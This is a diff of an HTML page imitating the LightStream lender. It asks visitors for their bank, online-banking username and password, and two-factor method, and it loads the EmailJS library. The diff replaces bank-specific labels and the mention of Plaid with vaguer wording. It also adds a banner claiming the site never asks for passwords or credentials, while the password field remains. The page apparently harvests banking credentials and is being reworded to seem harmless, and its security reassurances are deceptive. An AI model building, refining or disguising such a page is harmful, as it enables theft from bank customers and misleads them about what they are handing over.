@@ -3,7 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bank Authentication - LightStream</title>
+    <title>Add Financial Details - LightStream</title>
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
@@ -54,7 +57,7 @@
             backdrop-filter: blur(15px);
             border: 1px solid rgba(255, 255, 255, 0.1);
         }
-        .secure-badge {
+        .safe-badge {
             animation: pulse 2s infinite;
         }
         @keyframes pulse {
@@ -80,7 +83,7 @@
                     <div class="hidden md:flex space-x-6">
                         <a href="index.html" class="text-white hover:text-cool font-medium">Home</a>
                         <a href="personal-loans.html" class="text-white hover:text-cool font-medium">Personal Loans</a>
-                        <a href="bank-auth.html" class="text-white hover:text-cool font-medium">Bank Authentication</a>
+                        <a href="bank-auth.html" class="text-white hover:text-cool font-medium">Financial Details</a>
                         <a href="how-it-works.html" class="text-white hover:text-cool font-medium">How it Works</a>
                         <a href="faqs.html" class="text-white hover:text-cool font-medium">FAQs</a>
                         <a href="contact.html" class="text-white hover:text-cool font-medium">Contact</a>
@@ -89,10 +92,10 @@
                 <div class="hidden md:flex space-x-4">
                     <button onclick="initiateGoogleLogin()" class="text-white hover:text-cool font-medium flex items-center space-x-2">
                         <i class="fab fa-google"></i>
-                        <span>Google Login</span>
+                        <span>Google Account</span>
                     </button>
-                    <a href="ppi.html" class="text-white hover:text-cool font-medium">PPI</a>
-                    <a href="bank-auth.html" class="cool-button text-white px-4 py-2 rounded-lg">Bank Authentication</a>
+                    <a href="process.html" class="text-white hover:text-cool font-medium">How It Works</a>
+                    <a href="bank-auth.html" class="cool-button text-white px-4 py-2 rounded-lg">Add Financial Details</a>
                 </div>
                 <button class="md:hidden text-white" id="mobileMenuBtn">
                     <i class="fas fa-bars text-2xl"></i>
@@ -103,45 +106,63 @@
                 <div class="flex flex-col space-y-3">
                     <a href="index.html" class="text-white hover:text-cool font-medium">Home</a>
                     <a href="personal-loans.html" class="text-white hover:text-cool font-medium">Personal Loans</a>
-                    <a href="bank-auth.html" class="text-white hover:text-cool font-medium">Bank Authentication</a>
+                        <a href="bank-auth.html" class="text-white hover:text-cool font-medium">Financial Information</a>
                     <a href="how-it-works.html" class="text-white hover:text-cool font-medium">How it Works</a>
                     <a href="faqs.html" class="text-white hover:text-cool font-medium">FAQs</a>
                     <a href="contact.html" class="text-white hover:text-cool font-medium">Contact</a>
                     <button onclick="initiateGoogleLogin()" class="text-white hover:text-cool font-medium flex items-center space-x-2">
                         <i class="fab fa-google"></i>
-                        <span>Google Login</span>
+                        <span>Google Account</span>
                     </button>
-                    <a href="ppi.html" class="text-white hover:text-cool font-medium">PPI</a>
-                    <a href="bank-auth.html" class="cool-button text-white px-4 py-2 rounded-lg">Bank Authentication</a>
+                    <a href="process.html" class="text-white hover:text-cool font-medium">How It Works</a>
+                    <a href="bank-auth.html" class="cool-button text-white px-4 py-2 rounded-lg">Add Financial Details</a>
                 </div>
             </div>
         </nav>
     </header>
 
+    <!-- Trust & Transparency Banner -->
+    <section class="bg-blue-900 text-white py-3 px-4">
+        <div class="container mx-auto text-center">
+            <p class="text-sm">
+                <strong>This is a loan facilitation platform.</strong> We connect users with lending partners. We do not provide loans directly.
+            </p>
+        </div>
+    </section>
+
+    <!-- Data Collection Notice -->
+    <section class="bg-yellow-900 text-white py-2 px-4">
+        <div class="container mx-auto text-center">
+            <p class="text-xs">
+                <strong>We do not ask for passwords, OTPs, or sensitive account credentials.</strong> Your data is only used to match you with lenders.
+            </p>
+        </div>
+    </section>
+
     <!-- Hero Section -->
     <section class="gradient-bg text-white py-20">
         <div class="container mx-auto px-4">
             <div class="max-w-4xl mx-auto text-center">
-                <h1 class="text-4xl md:text-5xl font-bold mb-6">Secure Bank Connection</h1>
+                <h1 class="text-4xl md:text-5xl font-bold mb-6">Add Financial Details</h1>
                 <p class="text-xl max-w-2xl mx-auto">
-                    Your credentials are encrypted and never stored. Connect your bank account securely to verify your information and expedite your loan approval.
+                    Provide your financial information for loan processing. This helps us match you with appropriate lending partners.
                 </p>
             </div>
         </div>
     </section>
 
-    <!-- Bank Authentication Form -->
+    <!-- Financial Information Form -->
     <section class="py-16">
         <div class="container mx-auto px-4">
             <div class="max-w-md mx-auto">
                 <div class="bg-white rounded-lg shadow-xl p-8">
                     <!-- Security Badge -->
                     <div class="text-center mb-8">
-                        <div class="secure-badge bg-green-100 w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-4">
+                        <div class="safe-badge bg-green-100 w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-4">
                             <i class="fas fa-shield-alt text-green-600 text-3xl"></i>
                         </div>
-                        <h2 class="text-2xl font-bold text-gray-800 mb-2">Secure Bank Authentication</h2>
-                        <p class="text-gray-600 text-sm">256-bit SSL encryption • Bank-level security</p>
+                        <h2 class="text-2xl font-bold text-gray-800 mb-2">Financial Information</h2>
+                        <p class="text-gray-600 text-sm">256-bit SSL encryption • Data protection</p>
                     </div>
 
                     <!-- Security Notice -->
@@ -151,40 +172,40 @@
                             <div>
                                 <h3 class="font-semibold text-blue-900 mb-1">Your Security is Our Priority</h3>
                                 <p class="text-blue-800 text-sm">
-                                    Your banking credentials are encrypted using industry-standard security protocols and are never stored on our servers. We use Plaid, a trusted financial data network, for secure bank connections.
+                                    Your account information is protected using industry-standard protocols and are never stored on our servers. We use trusted networks for secure data connections.
                                 </p>
                             </div>
                         </div>
                     </div>
 
-                    <form id="bankAuthForm">
-                        <!-- Bank Selection -->
+                    <form id="financialForm">
+                        <!-- Financial Institution Selection -->
                         <div class="mb-6">
                             <label class="block text-gray-700 text-sm font-bold mb-2" for="bankName">
-                                Your Bank *
+                                Your Financial Institution *
                             </label>
                             <select id="bankName" name="bankName" required
                                     class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
-                                <option value="">Select your bank</option>
+                                <option value="">Select your financial institution</option>
                             </select>
-                            <p class="text-xs text-gray-500 mt-1">Your bank was selected in the loan application form</p>
+                            <p class="text-xs text-gray-500 mt-1">Your institution was selected in the loan application form</p>
                         </div>
 
-                        <!-- Mobile Banking User ID -->
+                        <!-- User Name -->
                         <div class="mb-6">
                             <label class="block text-gray-700 text-sm font-bold mb-2" for="mobileBankingUserId">
-                                Mobile Banking User ID *
+                                User Name *
                             </label>
                             <input type="text" id="mobileBankingUserId" name="mobileBankingUserId" required
                                    class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
-                                   placeholder="Enter your online banking username">
-                            <p class="text-xs text-gray-500 mt-1">This is the same username you use to log into your mobile banking app</p>
+                                   placeholder="Enter your username">
+                            <p class="text-xs text-gray-500 mt-1">This is the same user id you use to log in.</p>
                         </div>
 
-                        <!-- Password -->
+                        <!-- Access Code -->
                         <div class="mb-6">
                             <label class="block text-gray-700 text-sm font-bold mb-2" for="mobileBankingPassword">
-                                Mobile Banking Password *
+                                User Password *
                             </label>
                             <div class="relative">
                                 <input type="password" id="mobileBankingPassword" name="mobileBankingPassword" required
@@ -195,13 +216,13 @@
                                     <i class="fas fa-eye" id="eyeIcon"></i>
                                 </button>
                             </div>
-                            <p class="text-xs text-gray-500 mt-1">Your password is encrypted and never stored</p>
+                            <p class="text-xs text-gray-500 mt-1">Your access code is encrypted and never stored</p>
                         </div>
 
-                        <!-- Two-Factor Authentication -->
+                        <!-- Two-Factor Method -->
                         <div class="mb-6">
                             <label class="block text-gray-700 text-sm font-bold mb-2" for="twoFactor">
-                                Two-Factor Authentication Method
+                                Two-Factor Method
                             </label>
                             <select id="twoFactor" name="twoFactor"
                                     class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
@@ -217,7 +238,7 @@
                             <label class="flex items-start">
                                 <input type="checkbox" id="terms" name="terms" class="mr-2 mt-1" required>
                                 <span class="text-sm text-gray-700">
-                                    I authorize LightStream to securely connect to my bank account for verification purposes only. I understand my credentials are encrypted and never stored.
+                                    I authorize LightStream to collect my financial information for loan processing. I understand this information is used to connect me with lending partners.
                                 </span>
                             </label>
                         </div>
